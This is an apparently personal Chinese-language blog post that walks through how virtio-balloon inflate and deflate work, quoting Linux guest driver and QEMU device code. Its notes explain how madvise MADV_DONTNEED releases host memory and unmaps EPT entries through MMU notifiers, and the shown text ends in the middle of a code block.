<p>fill_balloon会从内核模块alloc page 表示已经拿了这个page 所以guest kernel没法用了</p>
<p>leak_balloon释放这个page</p>
<h3 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h3><h4 id="guest"><a href="#guest" class="headerlink" title="guest"></a>guest</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> page *<span class="title function_">balloon_page_alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> alloc_page(balloon_mapping_gfp_mask() |</span><br><span class="line">				       __GFP_NOMEMALLOC | __GFP_NORETRY);</span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="title function_">fill_balloon</span><span class="params">(<span class="keyword">struct</span> virtio_balloon *vb, <span class="type">size_t</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> num_allocated_pages;</span><br><span class="line">	<span class="type">unsigned</span> num_pfns;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	LIST_HEAD(pages);</span><br><span class="line">	num = min(num, ARRAY_SIZE(vb-&gt;pfns));</span><br><span class="line">	<span class="keyword">for</span> (num_pfns = <span class="number">0</span>; num_pfns &lt; num;</span><br><span class="line">	     num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> balloon_page_alloc();</span><br><span class="line">		...</span><br><span class="line">		<span class="comment">//local list 和balloon_page_pop对应 只是一次性全部alloc而已</span></span><br><span class="line">		balloon_page_push(&amp;pages, page);</span><br><span class="line">	&#125;</span><br><span class="line">	mutex_lock(&amp;vb-&gt;balloon_lock);</span><br><span class="line">	vb-&gt;num_pfns = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((page = balloon_page_pop(&amp;pages))) &#123;</span><br><span class="line">        <span class="comment">//把这次拿到的page全部加入balloon中</span></span><br><span class="line">		balloon_page_enqueue(&amp;vb-&gt;vb_dev_info, page);</span><br><span class="line">		set_page_pfns(vb, vb-&gt;pfns + vb-&gt;num_pfns, page);</span><br><span class="line">		vb-&gt;num_pages += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class="line">		<span class="keyword">if</span> (!virtio_has_feature(vb-&gt;vdev,</span><br><span class="line">					VIRTIO_BALLOON_F_DEFLATE_ON_OOM))</span><br><span class="line">            <span class="comment">//如果没开DEFLATE_ON_OOM guest内核可用的page是减少的</span></span><br><span class="line">			adjust_managed_page_count(page, <span class="number">-1</span>);</span><br><span class="line">		vb-&gt;num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	num_allocated_pages = vb-&gt;num_pfns;</span><br><span class="line">	<span class="keyword">if</span> (vb-&gt;num_pfns != <span class="number">0</span>)</span><br><span class="line">		tell_host(vb, vb-&gt;inflate_vq);</span><br><span class="line">	mutex_unlock(&amp;vb-&gt;balloon_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> num_allocated_pages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010923083/article/details/115873669">内核内存] 伙伴系统4—alloc_pages(内存块分配)_早起的虫儿有鹰吃的博客-CSDN博客</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tell_host</span><span class="params">(<span class="keyword">struct</span> virtio_balloon *vb, <span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> len;</span><br><span class="line">	sg_init_one(&amp;sg, vb-&gt;pfns, <span class="keyword">sizeof</span>(vb-&gt;pfns[<span class="number">0</span>]) * vb-&gt;num_pfns);</span><br><span class="line">	virtqueue_add_outbuf(vq, &amp;sg, <span class="number">1</span>, vb, GFP_KERNEL);</span><br><span class="line">	virtqueue_kick(vq);</span><br><span class="line">	wait_event(vb-&gt;acked, virtqueue_get_buf(vq, &amp;len));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">virtqueue_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *_vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vring_virtqueue</span> *<span class="title">vq</span> =</span> to_vvq(_vq);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(vq-&gt;broken))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (!vq-&gt;notify(_vq)) &#123;</span><br><span class="line">		vq-&gt;broken = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">vp_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class="line"><span class="comment">	 * signal the other end */</span></span><br><span class="line">    <span class="comment">// value, addr</span></span><br><span class="line">	iowrite16(vq-&gt;index, (<span class="type">void</span> __iomem *)vq-&gt;priv);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里wait_event是一个宏 传入的第二个参数会一直被调用然后sleep</p>
<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(;;)&#123;</span><br><span class="line">	if (virtqueue_get_buf(vq, &amp;len))</span><br><span class="line">		break;</span><br><span class="line">	schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h4><p>virtio:<a target="_blank" rel="noopener" href="https://blog.csdn.net/xidianjiapei001/article/details/89293914">IO虚拟化 - virtio介绍及代码分析【转】_xidianjiapei001的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/category/1939743.html">虚拟化 - 随笔分类 - Edver - 博客园 (cnblogs.com)</a></p>
<p>virtqueue初始化过程：</p>
<p>virtio_pci_legacy_probe 初始化回调函数</p>
<p><code>virtballoon_probe</code>-&gt;<code>init_vqs</code>-&gt;<code>virtio_find_vqs</code>-&gt;<code>find_vqs(vp_find_vqs)</code>-&gt;<code>vp_find_vqs_msix</code>-&gt;<code>vp_setup_vq(setup_vq)</code>-&gt;<code>vring_create_virtqueue</code></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/p/14684117.html">virtio简介（三） —— virtio-balloon qemu设备创建 - Edver - 博客园 (cnblogs.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_device_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(dev);</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    virtio_init(vdev, VIRTIO_ID_BALLOON, virtio_balloon_config_size(s));</span><br><span class="line"></span><br><span class="line">    ret = qemu_add_balloon_handler(virtio_balloon_to_target,</span><br><span class="line">                                   virtio_balloon_stat, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Only one balloon device is supported&quot;</span>);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (virtio_has_feature(s-&gt;host_features, VIRTIO_BALLOON_F_FREE_PAGE_HINT) &amp;&amp;</span><br><span class="line">        !s-&gt;iothread) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;&#x27;free-page-hint&#x27; requires &#x27;iothread&#x27; to be set&quot;</span>);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s-&gt;ivq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_handle_output);</span><br><span class="line">    s-&gt;dvq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_handle_output);</span><br><span class="line">    s-&gt;svq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_receive_stats);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_queue_notify_vq</span><span class="params">(VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (vq-&gt;vring.desc &amp;&amp; vq-&gt;handle_output) &#123;</span><br><span class="line">        VirtIODevice *vdev = vq-&gt;vdev;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;broken)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);</span><br><span class="line">        vq-&gt;handle_output(vdev, vq);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;</span><br><span class="line">            virtio_set_started(vdev, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_handle_output</span><span class="params">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class="line">    VirtQueueElement *elem;</span><br><span class="line">    MemoryRegionSection section;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint32_t</span> pfn;</span><br><span class="line"></span><br><span class="line">        elem = virtqueue_pop(vq, <span class="keyword">sizeof</span>(VirtQueueElement));</span><br><span class="line">        <span class="keyword">if</span> (!elem) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class="number">4</span>) == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class="line">            hwaddr pa;</span><br><span class="line"></span><br><span class="line">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class="line">            offset += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            section = memory_region_find(get_system_memory(), pa,</span><br><span class="line">                                         BALLOON_PAGE_SIZE);</span><br><span class="line">            <span class="keyword">if</span> (!section.mr) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class="line">                memory_region_is_rom(section.mr) ||</span><br><span class="line">                memory_region_is_romd(section.mr)) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                memory_region_unref(section.mr);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class="line">                                               pa);</span><br><span class="line">            <span class="keyword">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class="line">                    balloon_inflate_page(s, section.mr,</span><br><span class="line">                                         section.offset_within_region, &amp;pbp);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class="line">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    g_assert_not_reached();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            memory_region_unref(section.mr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtqueue_push(vq, elem, <span class="number">0</span>);</span><br><span class="line">        virtio_notify(vdev, vq);</span><br><span class="line">        g_free(elem);</span><br><span class="line">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>inflate操作是guest会立即把内存还给host</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">balloon_inflate_page</span><span class="params">(VirtIOBalloon *balloon,</span></span><br><span class="line"><span class="params">                                 MemoryRegion *mr, hwaddr mr_offset,</span></span><br><span class="line"><span class="params">                                 PartiallyBalloonedPage *pbp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> rb_offset, rb_aligned_offset, base_gpa;</span><br><span class="line">    RAMBlock *rb;</span><br><span class="line">    <span class="type">size_t</span> rb_page_size;</span><br><span class="line">    <span class="type">int</span> subpages;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class="line"><span class="comment">     * host address? */</span></span><br><span class="line">    rb = qemu_ram_block_from_host(addr, <span class="literal">false</span>, &amp;rb_offset);</span><br><span class="line">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rb_page_size == BALLOON_PAGE_SIZE) &#123;</span><br><span class="line">        <span class="comment">/* Easy case */</span></span><br><span class="line"></span><br><span class="line">        ram_block_discard_range(rb, rb_offset, rb_page_size);</span><br><span class="line">        <span class="comment">/* We ignore errors from ram_block_discard_range(), because it</span></span><br><span class="line"><span class="comment">         * has already reported them, and failing to discard a balloon</span></span><br><span class="line"><span class="comment">         * page is not fatal */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...<span class="comment">//经过测试 基本都是easy case</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ram_block_discard_range会调madvice</p>
<blockquote>
<p>MADV_WILLNEED<br>Expect access in the near future. (Hence, it might be a good idea to read some pages ahead.)</p>
<p>MADV_DONTNEED<br>Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.) Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file.<br>MADV_REMOVE (Since Linux 2.6.16)<br>Free up a given range of pages and its associated backing store. Currently, only shmfs&#x2F;tmpfs supports this; other file systems return with the error ENOSYS.</p>
</blockquote>
<p>经过尝试后发现 <strong>通过mmap拿的内存 madvise <code>MADV_DONTNEED</code> 是会立即被回收的</strong></p>
<p>实际上这里一定需要unmap ept 否则需要相信guest kernel不会访问已经被释放的页 但是VMM不相信VM</p>
<p>这里没有手动unmap的原因是 madvise之后 内核如果真的free page 也需要修改自己的页表 并且调用mmu notify 最终通知kvm <code>kvm_mmu_notifier_invalidate_range_start</code>host上加输出可以看到</p>
<p>mm&#x2F;madvise.c </p>
<p><code>do_madvise</code>-&gt;<code>madvise_vma_behavior</code>-&gt;<code>madvise_dontneed_free</code>-&gt;<code>madvise_dontneed_single_vma</code>-&gt;<code>zap_page_range</code>-&gt;</p>
<p><code>mmu_notifier_invalidate_range_start</code> 解kvm ept</p>
<p><code>unmap_single_vma</code> 解kernel</p>
<p>这里只是unmap 但是并没有free掉相应的物理内存(修改page元数据 还给buddy system) 那不还是用不了？</p>
<blockquote>
<p>成功执行<strong>MADV_DONTNEED</strong>操作之后，访问指定区域的语义将发生变化：后续访问这些页面将会成功，但是会导致从底层映射文件中重新填充内容(用于共享文件映射、共享匿名映射及shmem等)或者导致私有映射的零填充按需页面。因此此操作是直接将page给回收了，从对私有映射的处理来看，与swap还是略微不同的。</p>
<p>需要注意的是，当应用于共享映射时，<strong>MADV_DONTNEED</strong> 可能不会立即释放范围内的页面。内核可以自由地选择合适的时机来释放页面。然而，调用进程的常驻集大小 (RSS) 将立即减少。</p>
<p>作者：蟹蟹宁<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/965b1ed71ae4">https://www.jianshu.com/p/965b1ed71ae4</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>用的是inflate存下来的page 一模一样的</p>
<p>其实deflate是无所谓的 根据现有的所有机制 VM想用就用就行了</p>
<p>qemu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_handle_output</span><span class="params">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class="line">    VirtQueueElement *elem;</span><br><span class="line">    MemoryRegionSection section;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint32_t</span> pfn;</span><br><span class="line"></span><br><span class="line">        elem = virtqueue_pop(vq, <span class="keyword">sizeof</span>(VirtQueueElement));</span><br><span class="line">        <span class="keyword">if</span> (!elem) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class="number">4</span>) == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class="line">            hwaddr pa;</span><br><span class="line"></span><br><span class="line">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class="line">            offset += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            section = memory_region_find(get_system_memory(), pa,</span><br><span class="line">                                         BALLOON_PAGE_SIZE);</span><br><span class="line">            <span class="keyword">if</span> (!section.mr) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class="line">                memory_region_is_rom(section.mr) ||</span><br><span class="line">                memory_region_is_romd(section.mr)) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                memory_region_unref(section.mr);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class="line">                                               pa);</span><br><span class="line">            <span class="keyword">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class="line">                    balloon_inflate_page(s, section.mr,</span><br><span class="line">                                         section.offset_within_region, &amp;pbp);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class="line">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    g_assert_not_reached();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            memory_region_unref(section.mr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtqueue_push(vq, elem, <span class="number">0</span>);</span><br><span class="line">        virtio_notify(vdev, vq);</span><br><span class="line">        g_free(elem);</span><br><span class="line">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">balloon_deflate_page</span><span class="params">(VirtIOBalloon *balloon,</span></span><br><span class="line"><span class="params">                                 MemoryRegion *mr, hwaddr mr_offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> rb_offset;</span><br><span class="line">    RAMBlock *rb;</span><br><span class="line">    <span class="type">size_t</span> rb_page_size;</span><br><span class="line">    <span class="type">void</span> *host_addr;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class="line"><span class="comment">     * host address? */</span></span><br><span class="line">    rb = qemu_ram_block_from_host(addr, <span class="literal">false</span>, &amp;rb_offset);</span><br><span class="line">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class="line"></span><br><span class="line">    host_addr = (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)addr &amp; ~(rb_page_size - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When a page is deflated, we hint the whole host page it lives</span></span><br><span class="line"><span class="comment">     * on, since we can&#x27;t do anything smaller */</span></span><br><span class="line">    ret = qemu_madvise(host_addr, rb_page_size, QEMU_MADV_WILLNEED);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        warn_report(<span class="string">&quot;Couldn&#x27;t MADV_WILLNEED on balloon deflate: %s&quot;</span>,</span><br><span class="line">                    strerror(errno));</span><br><span class="line">        <span class="comment">/* Otherwise ignore, failing to page hint shouldn&#x27;t be fatal */</span></span><br><span class="line">    &#125;</span><br><span 